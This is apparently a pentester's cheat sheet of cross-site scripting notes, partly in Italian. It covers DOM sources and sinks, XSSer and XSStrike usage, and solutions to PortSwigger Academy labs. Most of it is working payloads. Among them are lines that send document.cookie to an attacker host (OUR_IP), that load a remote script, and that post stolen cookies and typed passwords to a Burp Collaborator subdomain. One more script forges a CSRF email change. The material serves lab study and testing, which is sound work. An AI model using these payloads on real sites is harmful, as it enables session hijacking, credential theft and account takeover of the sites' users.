

```
### XSS Vulnerabilities:


# XSS - DOM:
Lo scripting cross-site basato su DOM si verifica quando il codice JavaScript accetta l'input di un utente (source) e lo passa a un'altra funzione che visualizza i risultati nella pagina (sink) in modo non sicuro.

- Source
A source function is any JS property or function that accepts user input from somewhere on the page. An example of a source is the location.search property because it reads input from the query string.
> "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI", "location.search", "document.cookie", "document.referrer".

- Sink
A sink is a potentially dangerous JavaScript function that can caused undesirable effects if attacker controlled data is passed to it. Basically, if the function returns input back to the screen as output without security checks, it’s considered a sink. An example of this would be the “innerHTML” property used earlier as that changes the contents of the HTML page to whatever is given to it.
> "document.write()", "document.writeln()", "document.domain", "element.innerHTML", "element.outerHTML", "element.insertAdjacentHTML", "element.onevent".



```

```
### XSS General - Payload:


#. Overwrite website's main body:
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>	

#. Remove certain HTML element:
<script>document.getElementById('urlform').remove();</script>

#. Load remote script:
<script src="http://OUR_IP/script.js"></script>	

#. Send Cookie details to us:
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>	

#. XSS with Function:
?id=2646854";toDay='aler';aMonthAgo='t(1)';Function(toDay+aMonthAgo)()//-"d
?id=2646854";Function('aler'.concat('t(1));"

```

```
### XSS Tools:

Some of the common open-source tools that can assist us in XSS discovery are:
#. XSS Strike
#. Brute XSS
#. XSSer


#. XSSER - POST with specific parameter testing
> xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

#. XSSer - POST (Content-Type: application/x-www-form-urlencoded:
> xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

#. XSSer - With various payload using XSS --auto
> xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto


#. XSSer - From GET Request to XSSER GET:
> http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=jd&user-poll-php-submit-button=Submit+Vote

> http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote

## XSS - General Command
> --Fp "<script>alert(1)</script>" (Payload Custom)
> -- auto (Various Payload Automatic)
> -- url
> -p (Parameter in POST)
> -p 'target_host=XSS&id=1'  (Indica di usare il parametro)


#. Run xsstrike on a url parameter:
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"	

```


```
### XSS Lab Apprentice:

#1. Lab: Reflected XSS into HTML context with nothing encoded:
#1. <script>alert(1)</script>



#2. Lab: Stored XSS into HTML context with nothing encoded:
#2. <script>alert(1)</script>



#3. Lab: DOM XSS in document.write sink using source location.search:
DOM uses JavaScript "document.write" function, which writes data out to the page. 
The "document.write" function is called with data from "location.search", which you can control using the website URL.
Break out of the img attribute by searching for:

#3.
<img src="/resources/images?searchTerms=abcd">
<img src="/resources/images?searchTerms=""><svg onload=alert(1)>



#4. Lab: DOM XSS in innerHTML sink using source location.search:
DOM based search blog uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
>  <img src=1 onerror=alert(1)>



#5. DOM XSS in jQuery anchor href attribute sink using location.search source
>    href attribute inside - Change returnPath to:
javascript:alert(document.cookie)



#6. Lab: DOM XSS in jQuery selector sink using a hashchange event:
>    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>



#7. Lab: Reflected XSS into attribute with angle brackets HTML-encoded
>   "onmouseover="alert(1)



#8. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
>  Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute. 
>  javascript:alert(1)



#9. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
> '-alert(1)-'


```

```
### XSS Lab Practitioner

#10. Lab: DOM XSS in document.write sink using source location.search inside a select element. 
> document.write ->    location.search -> source
>  On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality. 
>  product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>



#11. Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded.
AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
>  View the page source and observe that your random string is enclosed in an ng-app directive. 
> Enter the following AngularJS expression in the search box:
{{$on.constructor('alert(1)')()}}



#12. Lab: Reflected DOM XSS
> Notice that the string is reflected in a JSON response called search-results.
From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call. 
> \"-alert(1)}//
>  An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:
>  {"searchTerm":"\\"-alert(1)}//", "results":[]}



#13. Lab: Stored DOM XSS
> <><img src=1 onerror=alert(1)>
The website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML



#14. Lab: Reflected XSS into HTML context with most tags and attributes blocked
> Fuzzing with Intruder to search attributes not blocked
> <§§> [body not blocked]
> <body%20§§=1> [onresize not blocked]
> <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>



#15. Lab: Reflected XSS into HTML context with all tags blocked except custom ones
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 



#16. Lab: Reflected XSS with some SVG markup allowed
> <§§>
> Observe that all payloads caused an HTTP 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response.
> <svg><animatetransform%20§§=1>  [200 for onbegin]
> https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E




#17. Lab: Reflected XSS in canonical link tag
>  To assist with your exploit, you can assume that the simulated user will press the following key combinations:

    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X
> https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
> This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called. 
> To trigger the exploit on yourself, press one of the following key combinations:

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X




#18. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped:
>  Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. 
>  </script><script>alert(1)</script>



#19. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
> Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string. 
> Try sending the payload test\payload and observe that your backslash doesn't get escaped. 
> Replace your input with the following payload to break out of the JavaScript string and inject an alert:
\'-alert(1)//



#20. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.
> Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.
> Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload:
> http://foo?&apos;-alert(1)-&apos;



#21. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
>  Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)} 



#22. Lab: Exploiting cross-site scripting to steal cookies
> <script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script> 




#23. Lab: Exploiting cross-site scripting to capture passwords
> Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">



#24. Lab: Exploiting XSS to perform CSRF
> You need to issue a POST request to /my-account/change-email, with a parameter called email.
> Submit the following payload in a blog comment:
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>























```

```
### XSS Lab Expert
```

